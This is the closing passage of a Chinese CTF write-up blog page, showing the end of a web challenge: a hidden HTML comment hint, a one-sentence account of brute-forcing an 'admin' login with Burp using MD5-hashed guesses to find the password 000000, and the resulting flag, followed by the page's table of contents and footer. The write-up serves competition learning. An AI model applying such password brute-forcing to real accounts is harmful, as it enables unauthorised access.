<pre class="line-numbers language-none"><code class="language-none">&lt;!-- 恭喜你找到flag --&gt;
&lt;!-- flag 为下方链接中视频简介第7行开始至第10行的全部小写字母和数字 --&gt;
&lt;!-- https:&#x2F;&#x2F;b23.tv&#x2F;BV1SD4y1J7uY --&gt;
&lt;!-- 庆祝一下吧！ --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>后面尝试去爆破admin,用burp中的brute forcer然后套md5爆破，爆破出来的密码是000000，然后有个302的包里面有flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;3e7dd426-5475-4789-9605-b1fac334af0f&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2023/12/28/moectf-wp/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/11/29/isctf/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-12-28 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ctf/">ctf<span>57</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>57</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#RE"><span class="toc-article-text">RE</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#easy-RE"><span class="toc-article-text">easy_RE</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#elf"><span class="toc-article-text">elf</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%92%B3"><span class="toc-article-text">咳</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Segments"><span class="toc-article-text">Segments</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#AndroXor"><span class="toc-article-text">AndroXor</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Endian"><span class="toc-article-text">Endian</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#EzPE"><span class="toc-article-text">EzPE</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#lazy-activtiy"><span class="toc-article-text">lazy_activtiy</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#pwn"><span class="toc-article-text">pwn</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ret2text"><span class="toc-article-text">ret2text</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ezshellcode"><span class="toc-article-text">ezshellcode</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#newstar-shop"><span class="toc-article-text">newstar shop</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#p1eee"><span class="toc-article-text">p1eee</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Random"><span class="toc-article-text">Random</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Crypto"><span class="toc-article-text">Crypto</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#brainfuck"><span class="toc-article-text">brainfuck</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Caesar%E2%80%99s-Secert"><span class="toc-article-text">Caesar’s Secert</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Fence"><span class="toc-article-text">Fence</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Vigenere"><span class="toc-article-text">Vigenère</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#babyrsa"><span class="toc-article-text">babyrsa</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#babyencoding"><span class="toc-article-text">babyencoding</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Small-d"><span class="toc-article-text">Small d</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#babyxor"><span class="toc-article-text">babyxor</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Affine"><span class="toc-article-text">Affine</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#babyaes"><span class="toc-article-text">babyaes</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Misc"><span class="toc-article-text">Misc</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CyberChef%E2%80%99s-Secret"><span class="toc-article-text">CyberChef’s Secret</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9C%BA%E5%AF%86%E5%9B%BE%E7%89%87"><span class="toc-article-text">机密图片</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B5%81%E9%87%8F%EF%BC%81%E9%B2%A8%E9%B1%BC%EF%BC%81"><span class="toc-article-text">流量！鲨鱼！</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BB%AC"><span class="toc-article-text">压缩包们</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%A9%BA%E7%99%BD%E6%A0%BC"><span class="toc-article-text">空白格</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%9A%90%E7%A7%98%E7%9A%84%E7%9C%BC%E7%9D%9B"><span class="toc-article-text">隐秘的眼睛</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#web"><span class="toc-article-text">web</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%B3%84%E6%BC%8F%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-article-text">泄漏的秘密</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Begin-of-Upload"><span class="toc-article-text">Begin of Upload</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Begin-of-HTTP"><span class="toc-article-text">Begin of HTTP</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ErrorFlask"><span class="toc-article-text">ErrorFlask</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Begin-of-PHP"><span class="toc-article-text">Begin of PHP</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#R-C-E"><span class="toc-article-text">R!C!E!</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#EasyLogin"><span class="toc-article-text">EasyLogin</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
